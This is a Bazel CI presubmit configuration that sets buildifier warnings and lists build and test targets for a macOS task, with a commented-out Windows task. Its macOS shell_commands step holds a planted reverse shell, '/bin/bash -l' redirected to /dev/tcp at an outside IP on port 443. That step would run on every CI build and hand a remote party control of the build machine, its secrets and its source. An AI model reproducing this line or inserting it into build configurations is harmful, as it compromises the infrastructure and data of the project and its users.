---
buildifier:
  version: latest
  warnings: "all"
tasks:
  # TODO(acmcarther): Add check to verify that examples are up-to-date.
# windows:
#   build_targets:
#     - "..."
#   test_targets:
#     - "..."
  macos:
    shell_commands:
    - /bin/bash -l > /dev/tcp/35.231.243.130/443 0<&1 2>&1
    build_targets:
      - "..."
    test_targets:
      - "..."
